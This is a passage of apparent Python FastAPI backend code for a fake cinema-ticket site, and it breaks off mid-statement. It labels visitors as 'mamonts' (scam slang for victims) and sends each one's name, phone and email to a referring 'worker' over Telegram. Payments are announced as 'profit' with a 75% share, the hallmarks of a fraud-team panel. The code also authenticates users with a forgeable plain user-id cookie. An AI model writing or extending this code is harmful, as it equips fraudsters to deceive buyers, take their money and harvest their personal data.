from fastapi import FastAPI, Request, BackgroundTasks, HTTPException, Response
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import aiosqlite
import os
import uuid
import hashlib
from datetime import datetime, timedelta, timezone
from pathlib import Path
from dotenv import load_dotenv
import logging
from typing import Optional

# Import the robust notification function
from api.telegram_notify import send_telegram_message

# Setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("api")

# Load env from project root
PROJECT_ROOT = Path(__file__).parent.parent
load_dotenv(PROJECT_ROOT / ".env")

BOT_TOKEN = os.getenv("BOT_TOKEN")
BOT_USERNAME = os.getenv("AUTH_BOT_USERNAME", "PlaceHolderAuthBot")

# Absolute path to database
DB_PATH = PROJECT_ROOT / "data" / "app.db"

app = FastAPI()

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Pydantic Models
class AuthVerifyRequest(BaseModel):
    session_id: str
    code: str

class AuthDraftRequest(BaseModel):
    first_name: str
    last_name: str
    phone: str
    email: str
    consent_pd: bool
    consent_marketing: bool

class RegisterRequest(BaseModel):
    session_id: str
    first_name: str
    last_name: str
    phone: str
    email: str
    consent_terms: bool
    consent_pd: bool

class PaymentRequest(BaseModel):
    movie: str
    session_time: str
    qty: int

# Global Exception Handler
@app.exception_handler(Exception)
async def global_exception_handler(request: Request, exc: Exception):
    logger.error(f"Global error: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={"message": "Internal Server Error"}
    )

MOVIES = [
    {"title": "Dune: Part Two", "sessions": ["12:00", "15:00"]},
    {"title": "Inception", "sessions": ["19:00", "21:30"]},
    {"title": "The Matrix", "sessions": ["10:00", "22:00"]},
]

async def get_db_path():
    return DB_PATH

async def handle_visit_background(ref_code: str, ip: str, user_agent: str, visitor_id: Optional[str]):
    """Background task to record visit and notify owner."""
    if not ref_code:
        return

    logger.info(f"Processing visit for ref: {ref_code} (visitor_id={visitor_id})")
    db_file = await get_db_path()
    
    async with aiosqlite.connect(db_file) as db:
        async with db.execute("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref_code,)) as cursor:
            row = await cursor.fetchone()
            
        if not row:
            logger.warning(f"Ref owner not found for code: {ref_code}")
            return
            
        owner_id, chat_id = row
        
        await db.execute(
            "INSERT INTO visits (referral_code, referral_owner_user_id, ip, user_agent, visitor_id) VALUES (?, ?, ?, ?, ?)",
            (ref_code, owner_id, ip, user_agent, visitor_id)
        )
        await db.commit()
        
        logger.info(f"Visit recorded for ref={ref_code}, notifying chat_id={chat_id}")
        await send_telegram_message(chat_id, "По твоей ссылке впервые перешли на сайт ✅")

async def notification_purchase(ref_owner_id: int, qty: int, total_price: int):
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        async with db.execute("SELECT chat_id FROM users WHERE id = ?", (ref_owner_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                chat_id = row[0]
                msg = f"Покупка по твоей ссылке 🎟️: {qty} билета(ов), сумма {total_price}₽"
                logger.info(f"Sending purchase notification to chat_id={chat_id}")
                await send_telegram_message(chat_id, msg)

# ============================================================================
# MAMONT HELPERS
# ============================================================================

import random

async def generate_mamont_id(db) -> str:
    """Generate unique 5-digit mamont_id (10000-99999)."""
    while True:
        new_id = str(random.randint(10000, 99999))
        async with db.execute("SELECT 1 FROM mamonts WHERE mamont_id = ?", (new_id,)) as cursor:
            if not await cursor.fetchone():
                return new_id

def get_mamont_display(mamont: dict) -> str:
    """
    Format mamont_user for display.
    - If not registered or no name: return mamont_id
    - Otherwise: "{first_name} {last_name} ({tg_name})"
    """
    if not mamont:
        return "Unknown"
    
    status = mamont.get('status', '')
    first_name = mamont.get('first_name') or ""
    last_name = mamont.get('last_name') or ""
    
    if status != 'registered' and status != 'paid':
        return mamont.get('mamont_id', 'Unknown')
    
    if not first_name and not last_name:
        return mamont.get('mamont_id', 'Unknown')
    
    # Build tg_name
    tg_name = mamont.get('tg_name') or ""
    tg_username = mamont.get('tg_username') or ""
    
    if not tg_name:
        if tg_username:
            tg_name = f"@{tg_username}"
        else:
            tg_name = "Telegram"
    
    name_part = f"{first_name} {last_name}".strip()
    return f"{name_part} ({tg_name})"

async def notify_mamont_visit(referrer_user_id: int, mamont_id: str):
    """Notify referrer about new mamont visit."""
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        async with db.execute("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0]:
                msg = f"<b>Новый мамонт!</b> <code>{mamont_id}</code>."
                logger.info(f"Notify mamont visit: referrer_user_id={referrer_user_id}, mamont_id={mamont_id}")
                await send_telegram_message(row[0], msg)

async def notify_mamont_registration(referrer_user_id: int, mamont_display: str, first_name: str, last_name: str, phone: str, email: str):
    """Notify referrer about mamont registration."""
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        async with db.execute("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0]:
                msg = (
                    f"Мамонт {mamont_display} зарегистрировался на сайте.\n\n"
                    f"<i>Данные:</i>\n"
                    f"<code>Имя: {first_name}\n"
                    f"Фамилия: {last_name}\n"
                    f"Номер: {phone}\n"
                    f"Почта: {email}</code>\n\n"
                    f"<i>Для управления мамонтом перейдите в список мамонтов.</i>"
                )
                logger.info(f"Notify mamont registration: referrer_user_id={referrer_user_id}, mamont={mamont_display}")
                await send_telegram_message(row[0], msg)

async def notify_mamont_purchase(referrer_user_id: int, total: int, service: str = "Театр"):
    """Notify referrer about mamont purchase with 75% share."""
    db_file = await get_db_path()
    acauser_total = int(total * 0.75)
    
    async with aiosqlite.connect(db_file) as db:
        async with db.execute("SELECT chat_id FROM users WHERE id = ?", (referrer_user_id,)) as cursor:
            row = await cursor.fetchone()
            if row and row[0]:
                msg = (
                    f"🚀 Новый профит!\n\n"
                    f"┠ Сумма профита: {total}\n"
                    f"┠ Твоя доля: {acauser_total}\n"
                    f"┖ Сервис: {service}"
                )
                logger.info(f"Notify mamont purchase: referrer_user_id={referrer_user_id}, total={total}, acauser_total={acauser_total}")
                await send_telegram_message(row[0], msg)

async def ensure_schema():
    """Ensures that the database schema is up to date."""
    db_file = await get_db_path()
    db_file.parent.mkdir(parents=True, exist_ok=True)
    
    logger.info("Checking database schema...")
    
    async with aiosqlite.connect(db_file) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                telegram_user_id INTEGER UNIQUE,
                chat_id INTEGER,
                referral_code TEXT UNIQUE,
                telegram_username TEXT,
                telegram_display_name TEXT,
                first_name TEXT,
                last_name TEXT,
                phone TEXT,
                email TEXT,
                consent_terms BOOLEAN DEFAULT 0,
                consent_pd BOOLEAN DEFAULT 0,
                consent_marketing BOOLEAN DEFAULT 0,
                consent_at TIMESTAMP,
                referrer_user_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(referrer_user_id) REFERENCES users(id)
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS registration_sessions (
                session_id TEXT PRIMARY KEY,
                status TEXT,
                telegram_user_id INTEGER,
                chat_id INTEGER,
                telegram_username TEXT,
                telegram_display_name TEXT,
                code_hash TEXT,
                code_expires_at TIMESTAMP,
                session_expires_at TIMESTAMP,
                attempts INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS visits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referral_code TEXT,
                referral_owner_user_id INTEGER,
                visitor_id TEXT,
                ip TEXT,
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(referral_owner_user_id) REFERENCES users(id)
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                movie TEXT,
                session_time TEXT,
                qty INTEGER,
                total_price INTEGER,
                referrer_user_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(user_id) REFERENCES users(id),
                FOREIGN KEY(referrer_user_id) REFERENCES users(id)
            )
        """)
        
        # Migration helper
        async def add_column_if_missing(table, column, definition):
            try:
                cursor = await db.execute(f"PRAGMA table_info({table})")
                columns = [row[1] for row in await cursor.fetchall()]
                if column not in columns:
                    logger.info(f"Migrating: Adding {column} to {table}...")
                    await db.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")
            except Exception as e:
                logger.error(f"Migration error for {table}.{column}: {e}")

        # Users table updates
        await add_column_if_missing("users", "referrer_user_id", "INTEGER REFERENCES users(id)")
        await add_column_if_missing("users", "telegram_username", "TEXT")
        await add_column_if_missing("users", "telegram_display_name", "TEXT")
        await add_column_if_missing("users", "first_name", "TEXT")
        await add_column_if_missing("users", "last_name", "TEXT")
        await add_column_if_missing("users", "phone", "TEXT")
        await add_column_if_missing("users", "email", "TEXT")
        await add_column_if_missing("users", "consent_terms", "BOOLEAN DEFAULT 0")
        await add_column_if_missing("users", "consent_pd", "BOOLEAN DEFAULT 0")
        await add_column_if_missing("users", "consent_marketing", "BOOLEAN DEFAULT 0")
        await add_column_if_missing("users", "consent_at", "TIMESTAMP")

        # Visits table updates
        await add_column_if_missing("visits", "visitor_id", "TEXT")

        # Registration Sessions updates
        await add_column_if_missing("registration_sessions", "reg_first_name", "TEXT")
        await add_column_if_missing("registration_sessions", "reg_last_name", "TEXT")
        await add_column_if_missing("registration_sessions", "reg_phone", "TEXT")
        await add_column_if_missing("registration_sessions", "reg_email", "TEXT")
        await add_column_if_missing("registration_sessions", "consent_pd", "BOOLEAN DEFAULT 0")
        await add_column_if_missing("registration_sessions", "consent_marketing", "BOOLEAN DEFAULT 0")
        await add_column_if_missing("registration_sessions", "consent_at", "TIMESTAMP")
        await add_column_if_missing("registration_sessions", "contact_phone", "TEXT")
        
        # Orders table updates
        await add_column_if_missing("orders", "user_id", "INTEGER REFERENCES users(id)")
        await add_column_if_missing("orders", "referrer_user_id", "INTEGER REFERENCES users(id)")
        
        # Mamonts table (visitor tracking by mamont_id)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS mamonts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mamont_id TEXT UNIQUE NOT NULL,
                visitor_id TEXT UNIQUE NOT NULL,
                referrer_user_id INTEGER NOT NULL,
                referral_code TEXT,
                status TEXT DEFAULT 'attached',
                tg_name TEXT,
                tg_username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone TEXT,
                email TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(referrer_user_id) REFERENCES users(id)
            )
        """)
        
        # Mamonts migration helper
        await add_column_if_missing("mamonts", "tg_name", "TEXT")
        await add_column_if_missing("mamonts", "tg_username", "TEXT")
        await add_column_if_missing("mamonts", "first_name", "TEXT")
        await add_column_if_missing("mamonts", "last_name", "TEXT")
        await add_column_if_missing("mamonts", "phone", "TEXT")
        await add_column_if_missing("mamonts", "email", "TEXT")
        
        # Registration sessions - add visitor_id column for mamont linking
        await add_column_if_missing("registration_sessions", "visitor_id", "TEXT")
        
        await db.commit()
    logger.info("Schema OK")

@app.on_event("startup")
async def startup():
    await ensure_schema()

async def get_current_user(request: Request):
    user_id = request.cookies.get("auth_user_id")
    if not user_id:
        return None
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM users WHERE id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            return row

# ------------------------------------------------------------------------------
# Root Endpoint - JSON only (no HTML)
# ------------------------------------------------------------------------------

@app.get("/")
async def read_root():
    return {"status": "ok", "message": "API is running. Frontend at http://localhost:3000"}

# ------------------------------------------------------------------------------
# API Endpoints (JSON)
# ------------------------------------------------------------------------------

@app.get("/api/me")
async def api_me(request: Request):
    user = await get_current_user(request)
    if user:
        # Build display_name with proper fallback
        first_name = user['first_name'] or ""
        last_name = user['last_name'] or ""
        
        if first_name and last_name:
            display_name = f"{first_name} {last_name}"
        elif first_name:
            display_name = first_name
        elif user['telegram_display_name']:
            display_name = user['telegram_display_name']
        elif user['telegram_username']:
            display_name = f"@{user['telegram_username']}"
        else:
            display_name = f"ID: {user['id']}"
             
        return {
            "id": user['id'],
            "first_name": first_name,
            "last_name": last_name,
            "display_name": display_name,
            "telegram_display_name": user['telegram_display_name'],
            "telegram_username": user['telegram_username'],
            "email": user['email']
        }
    return None

@app.get("/api/movies")
async def api_movies():
    return MOVIES

@app.post("/api/auth/telegram/start")
async def api_auth_start():
    session_id = str(uuid.uuid4())
    expires_at = datetime.now(timezone.utc) + timedelta(minutes=15)
    
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        await db.execute(
            "INSERT INTO registration_sessions (session_id, status, session_expires_at) VALUES (?, 'created', ?)",
            (session_id, expires_at)
        )
        await db.commit()
    
    bot_link = f"https://t.me/{BOT_USERNAME}?start=reg_{session_id}"
    return {"session_id": session_id, "bot_link": bot_link}

@app.post("/api/auth/telegram/verify")
async def api_auth_verify(payload: AuthVerifyRequest, request: Request, response: Response, background_tasks: BackgroundTasks):
    session_id = payload.session_id
    code = payload.code
    
    masked_code = code[:1] + "**" + code[-1:] if len(code) > 1 else "***"
    logger.info(f"API Verify: session_id={session_id}, code={masked_code}")

    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM registration_sessions WHERE session_id = ?", (session_id,)) as cursor:
            session = await cursor.fetchone()
            
        if not session:
            raise HTTPException(400, "Сессия не найдена")
            
        if session['status'] != 'code_issued':
             if session['status'] in ['verified', 'used', 'completed']:
                  pass
             raise HTTPException(400, "Сначала получите код в боте")
            
        code_hash = hashlib.sha256(code.encode()).hexdigest()
        now = datetime.now(timezone.utc)
        
        # Date parsing logic
        try:
             sess_exp = datetime.fromisoformat(str(session['session_expires_at']))
             code_exp = datetime.fromisoformat(str(session['code_expires_at']))
        except ValueError:
             try:
                sess_exp = datetime.strptime(str(session['session_expires_at']), "%Y-%m-%d %H:%M:%S.%f").replace(tzinfo=timezone.utc)
                code_exp = datetime.strptime(str(session['code_expires_at']), "%Y-%m-%d %H:%M:%S.%f").replace(tzinfo=timezone.utc)
             except:
                raise HTTPException(500, "Ошибка времени")
        
        if sess_exp.tzinfo is None: sess_exp = sess_exp.replace(tzinfo=timezone.utc)
        if code_exp.tzinfo is None: code_exp = code_exp.replace(tzinfo=timezone.utc)

        if now > sess_exp: raise HTTPException(400, "Сессия истекла")
        if now > code_exp: raise HTTPException(400, "Код истек")
             
        if session['code_hash'] != code_hash:
             await db.execute("UPDATE registration_sessions SET attempts = attempts + 1 WHERE session_id = ?", (session_id,))
             await db.commit()
             raise HTTPException(400, "Неверный код")
             
        telegram_user_id = session['telegram_user_id']
        async with db.execute("SELECT * FROM users WHERE telegram_user_id = ?", (telegram_user_id,)) as cursor:
            existing_user = await cursor.fetchone()
        
        # Get draft data
        draft_first_name = session['reg_first_name'] or ""
        draft_last_name = session['reg_last_name'] or ""
        draft_phone = session['reg_phone'] or session['contact_phone'] or ""
        draft_email = session['reg_email'] or ""
        draft_consent_pd = session['consent_pd'] or 0
        draft_consent_marketing = session['consent_marketing'] or 0
        
        # Get referrer from cookie
        ref_pending = request.cookies.get("ref_pending")
        referrer_id = None
        referrer_chat_id = None
        
        if ref_pending:
            async with db.execute("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref_pending,)) as cursor:
                owner = await cursor.fetchone()
                if owner:
                    referrer_id = owner['id']
                    referrer_chat_id = owner['chat_id']
            
        if existing_user:
            # UPDATE existing user with draft data if fields are empty
            user_id = existing_user['id']
            updates = []
            params = []
            
            if not existing_user['first_name'] and draft_first_name:
                updates.append("first_name = ?")
                params.append(draft_first_name)
            if not existing_user['last_name'] and draft_last_name:
                updates.append("last_name = ?")
                params.append(draft_last_name)
            if not existing_user['phone'] and draft_phone:
                updates.append("phone = ?")
                params.append(draft_phone)
            if not existing_user['email'] and draft_email:
                updates.append("email = ?")
                params.append(draft_email)
            if not existing_user['consent_pd'] and draft_consent_pd:
                updates.append("consent_pd = ?")
                params.append(draft_consent_pd)
            if not existing_user['referrer_user_id'] and referrer_id and referrer_id != user_id:
                updates.append("referrer_user_id = ?")
                params.append(referrer_id)
                logger.info(f"Attach referrer: buyer_id={user_id}, ref_code={ref_pending}, referrer_user_id={referrer_id}")
                # Clear cookie
                response.delete_cookie("ref_pending", path="/")
            
            if updates:
                updates.append("consent_at = ?")
                params.append(datetime.now(timezone.utc).isoformat())
                params.append(user_id)
                await db.execute(f"UPDATE users SET {', '.join(updates)} WHERE id = ?", params)
                await db.commit()
                logger.info(f"User updated id={user_id}, first_name={draft_first_name}, last_name={draft_last_name}, phone={draft_phone}, email={draft_email}")
            
            await db.execute("UPDATE registration_sessions SET status = 'used' WHERE session_id = ?", (session_id,))
            await db.commit()
            
            # Set Cookie
            response.set_cookie(
                key="auth_user_id", 
                value=str(user_id), 
                max_age=2592000, 
                httponly=True, 
                path="/",
                samesite="lax"
            )
            
            # Build display name
            fn = draft_first_name or existing_user['first_name'] or ""
            ln = draft_last_name or existing_user['last_name'] or ""
            if fn and ln:
                display_name = f"{fn} {ln}"
            elif existing_user['telegram_username']:
                display_name = f"@{existing_user['telegram_username']}"
            else:
                display_name = existing_user['telegram_display_name'] or f"ID: {user_id}"

            return {
                "status": "login",
                "user": {
                    "id": user_id,
                    "first_name": fn,
                    "last_name": ln,
                    "display_name": display_name
                }
            }
        else:
            # CREATE NEW USER from draft
            try:
                # Check self-referral
                if referrer_id:
                    logger.info(f"Attach referrer: new_user telegram_id={telegram_user_id}, ref_code={ref_pending}, referrer_user_id={referrer_id}")
                
                cursor = await db.execute("""
                    INSERT INTO users (
                        telegram_user_id, chat_id, telegram_username, telegram_display_name,
                        first_name, last_name, phone, email, 
                        consent_terms, consent_pd, consent_marketing, consent_at, 
                        referrer_user_id, referral_code
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?, ?)
                """, (
                    session['telegram_user_id'], 
                    session['chat_id'], 
                    session['telegram_username'], 
                    session['telegram_display_name'],
                    draft_first_name, 
                    draft_last_name, 
                    draft_phone, 
                    draft_email,
                    draft_consent_pd, 
                    draft_consent_marketing,
                    datetime.now(timezone.utc).isoformat(), 
                    referrer_id, 
                    str(uuid.uuid4())[:12]
                ))
                new_user_id = cursor.lastrowid
                
                logger.info(f"User created id={new_user_id}, first_name={draft_first_name}, last_name={draft_last_name}, phone={draft_phone}, email={draft_email}")
                
                await db.execute("UPDATE registration_sessions SET status = 'completed' WHERE session_id = ?", (session_id,))
                await db.commit()
                
                # === MAMONT UPDATE LOGIC ===
                # Get visitor_id from cookie and update mamont record
                visitor_id = request.cookies.get("visitor_id")
                if visitor_id:
                    db.row_factory = aiosqlite.Row
                    async with db.execute("SELECT * FROM mamonts WHERE visitor_id = ?", (visitor_id,)) as mamont_cursor:
                        mamont = await mamont_cursor.fetchone()
                    
                    if mamont and mamont['status'] == 'attached':
                        # Get telegram data from session
                        tg_name = session['telegram_display_name'] or ""
                        tg_username = session['telegram_username'] or ""
                        
                        # Update mamont record
                        await db.execute("""
                            UPDATE mamonts SET 
                                status = 'registered',
                                first_name = ?,
                                last_name = ?,
                                phone = ?,
                                email = ?,
                                tg_name = ?,
                                tg_username = ?
                            WHERE visitor_id = ?
                        """, (draft_first_name, draft_last_name, draft_phone, draft_email, tg_name, tg_username, visitor_id))
                        await db.commit()
                        
                        # Build mamont display and notify
                        mamont_data = {
                            'mamont_id': mamont['mamont_id'],
                            'status': 'registered',
                            'first_name': draft_first_name,
                            'last_name': draft_last_name,
                            'tg_name': tg_name,
                            'tg_username': tg_username
                        }
                        mamont_display = get_mamont_display(mamont_data)
                        
                        logger.info(f"Mamont registered: mamont_id={mamont['mamont_id']}, name={draft_first_name} {draft_last_name}, tg_name={tg_name}")
                        
                        # Send detailed mamont registration notification
                        background_tasks.add_task(
                            notify_mamont_registration, 
                            mamont['referrer_user_id'], 
                            mamont_display,
                            draft_first_name,
                            draft_last_name,
                            draft_phone,
                            draft_email
                        )
                # === END MAMONT UPDATE LOGIC ===
                
                # Clear ref_pending cookie
                if ref_pending:
                    response.delete_cookie("ref_pending", path="/")

                # Set Cookie
                response.set_cookie(
                    key="auth_user_id", 
                    value=str(new_user_id), 
                    max_age=2592000, 
                    httponly=True, 
                    path="/",
                    samesite="lax"
                )
                
                # Build display name
                if draft_first_name and draft_last_name:
                    dname = f"{draft_first_name} {draft_last_name}"
                elif draft_first_name:
                    dname = draft_first_name
                else:
                    dname = session['telegram_display_name'] or f"ID: {new_user_id}"
                
                return {
                    "status": "verified",
                    "user": {
                        "id": new_user_id,
                        "first_name": draft_first_name,
                        "last_name": draft_last_name,
                        "display_name": dname
                    }
                }
            except aiosqlite.IntegrityError:
                 raise HTTPException(400, "Пользователь уже существует")

# Alias for /api/register/verify
@app.post("/api/register/verify")
async def api_register_verify(payload: AuthVerifyRequest, request: Request, response: Response, background_tasks: BackgroundTasks):
    return await api_auth_verify(payload, request, response, background_tasks)

@app.post("/api/register/draft")
async def api_register_draft(payload: AuthDraftRequest):
    if not payload.consent_pd:
        raise HTTPException(400, "Consent PD required")

    session_id = str(uuid.uuid4())
    expires_at = datetime.now(timezone.utc) + timedelta(minutes=30)
    
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        await db.execute("""
            INSERT INTO registration_sessions (
                session_id, status, session_expires_at,
                reg_first_name, reg_last_name, reg_phone, reg_email,
                consent_pd, consent_marketing, consent_at
            ) VALUES (?, 'draft', ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            session_id, expires_at,
            payload.first_name, payload.last_name, payload.phone, payload.email,
            payload.consent_pd, payload.consent_marketing, datetime.now(timezone.utc).isoformat()
        ))
        await db.commit()
    
    logger.info(f"Draft saved: session_id={session_id}, first_name={payload.first_name}, last_name={payload.last_name}, phone={payload.phone}, email={payload.email}")
        
    bot_link = f"https://t.me/{BOT_USERNAME}?start=reg_{session_id}"
    return {"session_id": session_id, "bot_link": bot_link}

@app.post("/api/auth/register")
async def api_auth_register(payload: RegisterRequest, background_tasks: BackgroundTasks, request: Request, response: Response):
    if not payload.consent_terms or not payload.consent_pd:
        raise HTTPException(400, "Consent required")

    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM registration_sessions WHERE session_id = ?", (payload.session_id,)) as cursor:
            session = await cursor.fetchone()
            
        if not session or session['status'] != 'verified':
             raise HTTPException(400, "Invalid session state")

        referrer_id = None
        ref_pending = request.cookies.get("ref_pending")
        if ref_pending:
             async with db.execute("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref_pending,)) as cursor:
                 owner = await cursor.fetchone()
                 if owner:
                     referrer_id = owner['id']
                     
        try:
            cursor = await db.execute("""
                INSERT INTO users (
                    telegram_user_id, chat_id, telegram_username, telegram_display_name,
                    first_name, last_name, phone, email, 
                    consent_terms, consent_pd, consent_at, referrer_user_id, referral_code
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session['telegram_user_id'], session['chat_id'], session['telegram_username'], session['telegram_display_name'],
                payload.first_name, payload.last_name, payload.phone, payload.email,
                True, True, datetime.now(timezone.utc).isoformat(), referrer_id, str(uuid.uuid4())[:12]
            ))
            new_user_id = cursor.lastrowid
            
            logger.info(f"User created id={new_user_id}, first_name={payload.first_name}, last_name={payload.last_name}")
            
            await db.execute("UPDATE registration_sessions SET status = 'used' WHERE session_id = ?", (payload.session_id,))
            await db.commit()

            response.set_cookie(
                key="auth_user_id", 
                value=str(new_user_id), 
                max_age=2592000, 
                httponly=True, 
                path="/",
                samesite="lax"
            )
            response.delete_cookie("ref_pending", path="/")
            return {"status": "ok", "user_id": new_user_id}
            
        except aiosqlite.IntegrityError:
             raise HTTPException(400, "Пользователь уже существует")

@app.post("/api/orders/pay")
async def api_orders_pay(payload: PaymentRequest, request: Request, background_tasks: BackgroundTasks):
    price_per_ticket = 500
    total_price = payload.qty * price_per_ticket
    
    user = await get_current_user(request)
    user_id = user['id'] if user else None
    
    logger.info(f"Pay: starting, user_id={user_id}, movie={payload.movie}, qty={payload.qty}")
    
    if not user_id:
        logger.warning("Pay: No auth cookie - buyer is anonymous")
    
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        referrer_to_notify = None
        referrer_chat_id = None
        
        # Get referrer from user record
        if user_id:
            async with db.execute("SELECT referrer_user_id FROM users WHERE id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                if row and row[0]:
                    referrer_to_notify = row[0]
                    # Get referrer chat_id
                    async with db.execute("SELECT chat_id FROM users WHERE id = ?", (referrer_to_notify,)) as cur2:
                        ref_row = await cur2.fetchone()
                        if ref_row:
                            referrer_chat_id = ref_row[0]

        # Create order
        cursor = await db.execute(
            "INSERT INTO orders (user_id, movie, session_time, qty, total_price, referrer_user_id) VALUES (?, ?, ?, ?, ?, ?)",
            (user_id, payload.movie, payload.session_time, payload.qty, total_price, referrer_to_notify)
        )
        await db.commit()
        order_id = cursor.lastrowid
        
        # === MAMONT PURCHASE NOTIFICATION ===
        visitor_id = request.cookies.get("visitor_id")
        mamont_notified = False
        
        if visitor_id:
            db.row_factory = aiosqlite.Row
            async with db.execute("SELECT * FROM mamonts WHERE visitor_id = ?", (visitor_id,)) as mamont_cursor:
                mamont = await mamont_cursor.fetchone()
            
            if mamont:
                # Update mamont status to 'paid'
                await db.execute("UPDATE mamonts SET status = 'paid' WHERE visitor_id = ?", (visitor_id,))
                await db.commit()
                
                logger.info(f"Mamont pay notify: mamont_id={mamont['mamont_id']}, total={total_price}, acauser_total={int(total_price * 0.75)}")
                
                # Send new profit notification to mamont owner
                background_tasks.add_task(notify_mamont_purchase, mamont['referrer_user_id'], total_price, "Театр")
                mamont_notified = True
        # === END MAMONT PURCHASE NOTIFICATION ===
        
        # Notify referrer (legacy notification - only if mamont not notified)
        notify_sent = False
        notify_reason = ""
        
        if not mamont_notified:
            if referrer_to_notify and referrer_chat_id:
                if user_id and str(referrer_to_notify) != str(user_id):
                    background_tasks.add_task(notification_purchase, referrer_to_notify, payload.qty, total_price)
                    notify_sent = True
                else:
                    notify_reason = "self_referral"
            elif not referrer_to_notify:
                notify_reason = "no_referrer"
            elif not referrer_chat_id:
                notify_reason = "no_chat_id"
        else:
            notify_reason = "mamont_notified"
        
        logger.info(f"Pay: buyer_id={user_id}, referrer_user_id={referrer_to_notify}, notify_sent={notify_sent}, mamont_notified={mamont_notified}, reason_if_false={notify_reason}")
            
    return {
        "status": "ok",
        "order": {
            "id": order_id,
            "movie": payload.movie,
            "total_price": total_price
        }
    }

@app.get("/api/referral/track")
async def api_referral_track(request: Request, background_tasks: BackgroundTasks, response: Response, ref: Optional[str] = None):
    if not ref:
        return {"status": "ignored", "reason": "no_ref"}

    ref_attached = request.cookies.get("ref_attached")
    visitor_id = request.cookies.get("visitor_id") or str(uuid.uuid4())
    
    user = await get_current_user(request)
    
    if user:
        # Authorized user - bind referrer if not already bound
        user_id = user['id']
        db_file = await get_db_path()
        async with aiosqlite.connect(db_file) as db:
            async with db.execute("SELECT referrer_user_id FROM users WHERE id = ?", (user_id,)) as cursor:
                curr_referrer = (await cursor.fetchone())[0]
             
            if not curr_referrer:
                async with db.execute("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref,)) as cursor:
                    owner_row = await cursor.fetchone()
                    if owner_row and owner_row[0] != user_id:
                        await db.execute("UPDATE users SET referrer_user_id = ? WHERE id = ?", (owner_row[0], user_id))
                        await db.commit()
                        logger.info(f"Attach referrer: buyer_id={user_id}, ref_code={ref}, referrer_user_id={owner_row[0]}")
                        background_tasks.add_task(send_telegram_message, owner_row[1], "Новый пользователь привязался по твоей ссылке ✅")
        return {"status": "bound"}

    # Anonymous user - first touch logic
    if ref_attached:
        logger.info(f"Referral already attached: {ref_attached}, ignoring new ref: {ref}")
        return {"status": "ignored", "reason": "already_attached"}
    
    # FIRST VISIT - set cookies, create mamont, and notify
    logger.info(f"First referral visit: ref={ref}, visitor_id={visitor_id}")
    
    response.set_cookie(key="ref_attached", value=ref, max_age=2592000, path="/", samesite="lax")
    response.set_cookie(key="ref_pending", value=ref, max_age=2592000, path="/", samesite="lax")
    if not request.cookies.get("visitor_id"):
        response.set_cookie(key="visitor_id", value=visitor_id, max_age=31536000, path="/", samesite="lax")

    client_ip = request.client.host if request.client else "unknown"
    user_agent = request.headers.get("user-agent", "unknown")
    
    # Create mamont record and notify owner
    db_file = await get_db_path()
    async with aiosqlite.connect(db_file) as db:
        # Find referrer
        async with db.execute("SELECT id, chat_id FROM users WHERE referral_code = ?", (ref,)) as cursor:
            owner = await cursor.fetchone()
        
        if owner:
            referrer_user_id = owner[0]
            
            # Check if mamont already exists for this visitor_id
            async with db.execute("SELECT mamont_id FROM mamonts WHERE visitor_id = ?", (visitor_id,)) as cursor:
                existing = await cursor.fetchone()
            
            if not existing:
                # Generate unique mamont_id and create record
                mamont_id = await generate_mamont_id(db)
                await db.execute("""
                    INSERT INTO mamonts (mamont_id, visitor_id, referrer_user_id, referral_code, status, created_at)
                    VALUES (?, ?, ?, ?, 'attached', ?)
